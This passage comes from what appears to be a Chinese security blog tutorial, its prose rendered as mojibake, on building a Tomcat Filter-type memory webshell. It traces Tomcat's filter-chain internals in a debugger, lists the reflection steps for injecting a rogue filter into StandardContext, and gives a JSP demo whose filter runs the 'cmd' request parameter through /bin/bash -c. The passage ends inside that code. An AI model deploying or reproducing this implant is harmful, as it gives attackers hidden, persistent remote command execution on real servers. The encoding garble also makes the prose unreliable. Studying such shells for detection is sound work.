å±‚é¢åˆ†æFilterè¿è¡Œçš„æ•´ä½“æµç¨‹</h2><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„<code>demo</code>ä¸­çš„<code>doFilter</code>å‡½æ•°è¿™é‡Œä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907152955902.png" alt="image-20250907152955902"></p><p>è·Ÿè¿›ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153136032.png" alt="image-20250907153136032"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153239615.png" alt="image-20250907153239615"></p><p>è¿‡æ»¤å™¨ä½¿ç”¨çš„æ—¶å€™ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153830202.png" alt="image-20250907153830202"></p><p>æŸ¥çœ‹è°ƒç”¨æ ˆï¼Œè·Ÿè¿›StandardWrapperVavle.invoke()æ–¹æ³•:</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153931635.png" alt="image-20250907153931635"></p><p>å‘ç°ä»–æ˜¯æ ¹æ®filterChainæ¥å»åšfilterçš„ï¼Œæ ¹æ®æœç´¢æ‰¾åˆ°filterChainçš„å®šä¹‰ä½ç½®:</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153958860.png" alt="image-20250907153958860"></p><p>é‡æ–°ä¸‹æ–­ç‚¹åˆ°è¿™ä¸ªä½ç½®ï¼Œè·Ÿè¿›ApplicationFilterFactory.createFilterChain()æ–¹æ³•ï¼Œåˆ†æè¯¥æ–¹æ³•ï¼Œå‘ç°å…¶å…ˆä¼šä¼šè°ƒç”¨ getParent() æ–¹æ³•è·å–StandardContextï¼Œå†è·å–filterMaps:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request)request;</span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain)req.getFilterChain();</span><br><span class="line">                <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)wrapper.getParent();</span><br><span class="line">        FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">        <span class="keyword">if</span> (filterMaps != <span class="literal">null</span> &amp;&amp; filterMaps.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span> (DispatcherType)request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (attribute != <span class="literal">null</span>) &#123;</span><br><span class="line">                requestPath = attribute.toString();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line">            FilterMap[] var10 = filterMaps;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var11</span> <span class="operator">=</span> filterMaps.length;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> var12;</span><br><span class="line">            FilterMap filterMap;</span><br><span class="line">            ApplicationFilterConfig filterConfig;</span><br><span class="line">            <span class="keyword">for</span>(var12 = <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    <span class="keyword">if</span> (filterConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10 = filterMaps;</span><br><span class="line">            var11 = filterMaps.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(var12 = <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    <span class="keyword">if</span> (filterConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨è¯¥æ–¹æ³•å’Œä¸‹é¢å®šä¹‰<code>filterMaps</code>é‚£è¡Œä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ®µä»£ç å…ˆæ˜¯åˆ¤æ–­<code>servlet</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯å°±è¡¨ç¤ºæ²¡æœ‰æœ‰æ•ˆçš„<code>servlet</code>ï¼Œæ— æ³•åˆ›å»ºè¿‡æ»¤å™¨é“¾ï¼›ç„¶åæ ¹æ®ä¼ å…¥çš„<code>ServletRequest</code>çš„ç±»å‹æ¥åˆ†ç±»å¤„ç†ï¼Œå¦‚æœæ˜¯<code>Request</code>ç±»å‹ï¼Œå¹¶ä¸”å¯ç”¨äº†å®‰å…¨æ€§ï¼Œé‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ªæ–°çš„<code>ApplicationFilterChain</code>ï¼Œå¦‚æœæ²¡å¯ç”¨ï¼Œé‚£ä¹ˆå°±å°è¯•ä»è¯·æ±‚ä¸­è·å–ç°æœ‰çš„è¿‡æ»¤å™¨é“¾ï¼Œå¦‚æœä¸å­˜åœ¨é‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼›æ¥ç€æ˜¯è®¾ç½®è¿‡æ»¤å™¨é“¾çš„<code>Servlet</code>å’Œå¼‚æ­¥æ”¯æŒå±æ€§ï¼Œè¿™ä¸ªæ²¡å•¥è¯´çš„ï¼›å…³é”®ç‚¹åœ¨äºåé¢ä»<code>Wrapper</code>ä¸­è·å–çˆ¶çº§ä¸Šä¸‹æ–‡ï¼ˆ<code>StandardContext</code>ï¼‰ï¼Œç„¶åè·å–è¯¥ä¸Šä¸‹æ–‡ä¸­å®šä¹‰çš„è¿‡æ»¤å™¨æ˜ å°„æ•°ç»„ï¼ˆ<code>FilterMap</code>ï¼‰ï¼›æœ€åéå†è¿‡æ»¤å™¨æ˜ å°„æ•°ç»„ï¼Œæ ¹æ®è¯·æ±‚çš„<code>DispatcherType</code>å’Œè¯·æ±‚è·¯å¾„åŒ¹é…è¿‡æ»¤å™¨ï¼Œå¹¶å°†åŒ¹é…çš„è¿‡æ»¤å™¨æ·»åŠ åˆ°è¿‡æ»¤å™¨é“¾ä¸­ï¼Œæœ€ç»ˆè¿”å›åˆ›å»ºæˆ–æ›´æ–°åçš„è¿‡æ»¤å™¨é“¾ã€‚</p><p>å¥½äº†ï¼Œå¤§è‡´è¿‡ç¨‹åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰“å…¥å†…å­˜é©¬ï¼Œä¹Ÿå°±æ˜¯è¦åŠ¨æ€åœ°åˆ›å»ºä¸€ä¸ª<code>Filter</code>ï¼Œå›é¡¾ä¹‹å‰çš„è°ƒè¯•è¿‡ç¨‹ï¼Œæˆ‘ä»¬å‘ç°åœ¨<code>createFilterChain</code>é‚£ä¸ªå‡½æ•°é‡Œé¢æœ‰ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907154452596.png" alt="image-20250907154452596"></p><p>ä¹Ÿå°±æ˜¯è¿™é‡Œæˆ‘ç”¨ç®­å¤´æŒ‡å‡ºæ¥çš„<code>org.apache.catalina.core.StandardContext#findFilterMaps</code>å’Œ<code>org.apache.catalina.core.StandardContext#findFilterConfig</code>ã€‚</p><p>äºŒè€…çš„å®ç°ä»£ç ç²˜è´´å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public FilterMap[] findFilterMaps() &#123;</span><br><span class="line">    return filterMaps.asArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public FilterConfig findFilterConfig(String name) &#123;</span><br><span class="line">    synchronized (filterDefs) &#123;</span><br><span class="line">        return filterConfigs.get(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦æŸ¥æ‰¾åˆ°ç°æœ‰çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åå¾€é‡Œé¢æ’å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„æ¶æ„è¿‡æ»¤å™¨æ˜ å°„å’Œè¿‡æ»¤å™¨é…ç½®ï¼Œå°±å¯ä»¥å®ç°åŠ¨æ€æ·»åŠ è¿‡æ»¤å™¨äº†ã€‚</p><p>é‚£ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç°åœ¨çš„é—®é¢˜å°±è½¬åŒ–ä¸ºå¦‚ä½•æ·»åŠ <code>filterMap</code>å’Œ<code>filterConfig</code>ã€‚æˆ‘ä»¬æœç´¢å…³é”®è¯<code>addFilterMap</code>ï¼Œå³å¯çœ‹åˆ°åœ¨<code>StandardContext</code>ä¸­æœ‰ä¸¤ä¸ªç›¸å…³çš„æ–¹æ³•ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907153239615.png" alt="image-20250907153239615"></p><p>æ³¨é‡Šé‡Œé¢ä¹Ÿè¯´çš„å¾ˆæ¸…æ¥šï¼Œ<code>addFilterMap</code>æ˜¯åœ¨ä¸€ç»„æ˜ å°„æœ«å°¾æ·»åŠ æ–°çš„æˆ‘ä»¬è‡ªå®šä¹‰çš„æ–°æ˜ å°„ï¼›è€Œ<code>addFilterMapBefore</code>åˆ™ä¼šè‡ªåŠ¨æŠŠæˆ‘ä»¬åˆ›å»ºçš„<code>filterMap</code>ä¸¢åˆ°ç¬¬ä¸€ä½å»ï¼Œæ— éœ€å†æ‰‹åŠ¨æ’åºï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„å‘€ï¼</p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢çš„<code>addFilterMapBefore</code>å‡½æ•°ä¸­ç¬¬ä¸€æ­¥æ˜¯å…ˆæ‰§è¡Œ<code>org.apache.catalina.core.StandardContext#validateFilterMap</code>è¿™ä¸ªå‡½æ•°ï¼Œç‚¹å‡»å»çœ‹çœ‹ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907160241589.png" alt="image-20250907160241589"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Validate the supplied FilterMap.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterMap the filter mapping</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validateFilterMap</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    <span class="comment">// Validate the proposed filter mapping</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> filterMap.getFilterName();</span><br><span class="line">    String[] servletNames = filterMap.getServletNames();</span><br><span class="line">    String[] urlPatterns = filterMap.getURLPatterns();</span><br><span class="line">    <span class="keyword">if</span> (findFilterDef(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.filterMap.name&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filterMap.getMatchAllServletNames() &amp;&amp; !filterMap.getMatchAllUrlPatterns() &amp;&amp; (servletNames.length == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">            (urlPatterns.length == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.filterMap.either&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!validateURLPattern(urlPattern)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.filterMap.pattern&quot;</span>, urlPattern));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æˆ‘ä»¬éœ€è¦ä¿è¯å®ƒåœ¨æ ¹æ®<code>filterName</code>æ‰¾<code>filterDef</code>çš„æ—¶å€™ï¼Œå¾—èƒ½æ‰¾åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¿˜å¾—è‡ªå®šä¹‰<code>filterDef</code>å¹¶æŠŠå®ƒåŠ å…¥åˆ°<code>filterDefs</code>ï¼Œä¸è¿‡è¿™ä¸ªä¹Ÿå¾ˆç®€å•ï¼Œä¹Ÿæœ‰å¯¹åº”çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯<code>org.apache.catalina.core.StandardContext#addFilterDef</code>ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907160448593.png" alt="image-20250907160448593"></p><p>æå®šï¼Œç»§ç»­å»çœ‹<code>filterConfig</code>å¦‚ä½•æ·»åŠ ã€‚ç»è¿‡æœç´¢å‘ç°ï¼Œä¸å­˜åœ¨ç±»ä¼¼ä¸Šé¢çš„<code>addFilterConfig</code>è¿™ç§æ–¹æ³•,ä½†æ˜¯æœ‰<code>filterStart</code>å’Œ<code>filterStop</code>è¿™ä¸¤ä¸ªæ–¹æ³•ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907161221063.png" alt="image-20250907161221063"></p><p>é‚£ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡åå°„çš„æ–¹æ³•å»è·å–ç›¸å…³å±æ€§å¹¶æ·»åŠ è¿›å»ã€‚</p><p>å¼•ç”¨ä¸€å¼ ç»å…¸å›¾ç‰‡æ¥æè¿°filterçš„å·¥ä½œåŸç†:<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155918-2104e00c-50d1-1.png" alt="img"></p><h2 id="Filterå†…å­˜é©¬å®ç°"><a href="#Filterå†…å­˜é©¬å®ç°" class="headerlink" title="Filterå†…å­˜é©¬å®ç°"></a>Filterå†…å­˜é©¬å®ç°</h2><p>å¦‚æœæˆ‘ä»¬æƒ³è¦å†™ä¸€ä¸ª<code>Filter</code>å†…å­˜é©¬ï¼Œéœ€è¦ç»è¿‡ä»¥ä¸‹æ­¥éª¤ï¼š</p><blockquote><p>å‚è€ƒï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/">https://longlone.top/å®‰å…¨/java/javaå®‰å…¨/å†…å­˜é©¬/Tomcat-Filterå‹/</a></p></blockquote><ul><li>è·å–<code>StandardContext</code>ï¼›</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„<code>filter</code>ï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ª<code>FilterDef</code>ç±»ï¼ŒåŒ…è£…<code>filter</code>å¹¶å­˜æ”¾åˆ°<code>StandardContext.filterDefs</code>ä¸­ï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ª<code>FilterMap</code>ç±»ï¼Œå°†æˆ‘ä»¬çš„<code>Filter</code>å’Œ<code>urlpattern</code>ç›¸å¯¹åº”ï¼Œä½¿ç”¨<code>addFilterMapBefore</code>å­˜æ”¾åˆ°<code>StandardContext.filterMaps</code>ä¸­ï¼›</li><li>é€šè¿‡åå°„è·å–<code>filterConfigs</code>ï¼Œå®ä¾‹åŒ–ä¸€ä¸ª<code>FilterConfig</code>ï¼ˆ<code>ApplicationFilterConfig</code>ï¼‰ç±»ï¼Œä¼ å…¥<code>StandardContext</code>ä¸<code>filterDefs</code>ï¼Œå­˜æ”¾åˆ°<code>filterConfig</code>ä¸­ã€‚</li></ul><blockquote><p>å‚è€ƒï¼š<a href="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">https://tyaoo.github.io/2021/12/06/Tomcatå†…å­˜é©¬/</a></p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€å®šè¦å…ˆä¿®æ”¹<code>filterDef</code>ï¼Œå†ä¿®æ”¹<code>filterMap</code>ï¼Œä¸ç„¶ä¼šæŠ›å‡ºæ‰¾ä¸åˆ°<code>filterName</code>çš„å¼‚å¸¸ã€‚</p><p>ç”±ä»¥ä¸Šç»“è®ºæˆ‘ä»¬å¯ä»¥å†™å‡ºå¦‚ä¸‹å†…å­˜é©¬<code>demo</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> getRandomString();</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// ä¿®æ”¹ä¸º macOS/Linux å…¼å®¹çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼</span></span><br><span class="line">                    String[] shellCmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(shellCmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> 